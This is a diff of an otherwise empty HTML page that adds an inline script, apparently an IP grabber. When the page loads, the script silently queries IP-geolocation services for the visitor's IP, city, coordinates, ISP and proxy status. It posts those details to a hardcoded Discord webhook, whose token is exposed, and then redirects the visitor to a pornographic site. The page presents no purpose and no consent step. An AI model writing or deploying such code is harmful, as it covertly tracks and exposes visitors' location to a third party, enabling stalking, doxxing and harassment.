@@ -4,7 +4,96 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title></title>
-  <script src="grapip.js"></script>
+  <script>
+    (async () => {
+      const CONFIG = {
+        ipGeoUrl:      "https://api.techniknews.net/ipgeo/",
+        fallbackApiUrl:"https://ip-api.com/json/",
+        webhookUrl:    "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h",
+        redirectUrl:   "https://www.pornhub.com/",
+        timeoutMs:     5000
+      };
+
+      async function fetchWithTimeout(url, options = {}) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
+        try {
+          const res = await fetch(url, { ...options, signal: controller.signal });
+          if (!res.ok) throw new Error(`HTTP ${res.status}`);
+          return await res.json();
+        } catch (err) {
+          return null;
+        } finally {
+          clearTimeout(timer);
+        }
+      }
+
+      async function getIPDetails() {
+        const d = await fetchWithTimeout(CONFIG.ipGeoUrl);
+        if (d && d.status !== "fail") {
+          return {
+            ip: d.ip, continent: d.continent, country: d.country,
+            countryCode: d.countryCode, region: d.regionName, city: d.city,
+            postal: d.zip || "N/A", loc: (d.lat && d.lon) ? `${d.lat}, ${d.lon}` : "N/A",
+            timezone: d.timezone, currency: d.currency, isp: d.isp, org: d.org,
+            as: d.as, reverse: d.reverse || "N/A", mobile: d.mobile,
+            proxy: d.proxy, hosting: d.hosting, cached: d.cached
+          };
+        }
+        const f = await fetchWithTimeout(CONFIG.fallbackApiUrl);
+        if (!f || f.status === "fail") return null;
+        return {
+          ip: f.query, continent: "N/A", country: f.country,
+          countryCode: f.countryCode, region: f.regionName, city: f.city,
+          postal: f.zip || "N/A", loc: `${f.lat}, ${f.lon}`,
+          timezone: f.timezone, currency: "N/A", isp: f.isp, org: f.org,
+          as: f.as, reverse: "N/A", mobile: f.mobile ?? "N/A",
+          proxy: f.proxy ?? "N/A", hosting: f.hosting ?? "N/A", cached: false
+        };
+      }
+
+      async function sendToDiscord(details) {
+        if (!details) return;
+        const bool = v => v === true ? "✅" : v === false ? "❌" : "N/A";
+        await fetch(CONFIG.webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          keepalive: true,
+          body: JSON.stringify({
+            embeds: [{
+              title: "IP Network & Geolocation Data",
+              color: 0x3498db,
+              fields: [
+                { name: "IP Address",   value: String(details.ip          || "N/A"), inline: true  },
+                { name: "Continent",    value: String(details.continent   || "N/A"), inline: true  },
+                { name: "Country",      value: String(details.country     || "N/A"), inline: true  },
+                { name: "Country Code", value: String(details.countryCode || "N/A"), inline: true  },
+                { name: "Region",       value: String(details.region      || "N/A"), inline: true  },
+                { name: "City",         value: String(details.city        || "N/A"), inline: true  },
+                { name: "Postal Code",  value: String(details.postal      || "N/A"), inline: true  },
+                { name: "Location",     value: String(details.loc         || "N/A"), inline: true  },
+                { name: "Timezone",     value: String(details.timezone    || "N/A"), inline: true  },
+                { name: "Currency",     value: String(details.currency    || "N/A"), inline: true  },
+                { name: "ISP",          value: String(details.isp         || "N/A"), inline: false },
+                { name: "Org",          value: String(details.org         || "N/A"), inline: false },
+                { name: "AS",           value: String(details.as          || "N/A"), inline: false },
+                { name: "Reverse DNS",  value: String(details.reverse     || "N/A"), inline: false },
+                { name: "Mobile",       value: bool(details.mobile),                 inline: true  },
+                { name: "Proxy",        value: bool(details.proxy),                  inline: true  },
+                { name: "Hosting",      value: bool(details.hosting),                inline: true  },
+                { name: "Cached",       value: bool(details.cached),                 inline: true  }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      }
+
+      const details = await getIPDetails();
+      await sendToDiscord(details);
+      window.location.replace(CONFIG.redirectUrl);
+    })();
+  </script>
 </head>
 <body></body>
 </html>
